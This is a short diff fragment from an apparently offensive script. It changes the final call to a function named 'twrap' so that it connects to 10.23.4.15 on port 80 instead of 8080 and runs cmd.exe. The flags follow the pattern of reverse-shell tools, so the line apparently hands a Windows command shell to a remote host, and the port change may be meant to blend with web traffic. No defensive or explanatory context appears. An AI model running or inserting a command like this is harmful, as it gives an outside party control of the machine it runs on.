@@ -526,4 +526,4 @@ function twrap
   ########## EXECUTION ##########
 }
 
-twrap -c 10.23.4.15 -p 8080 -e cmd.exe
+twrap -c 10.23.4.15 -p 80 -e cmd.exe
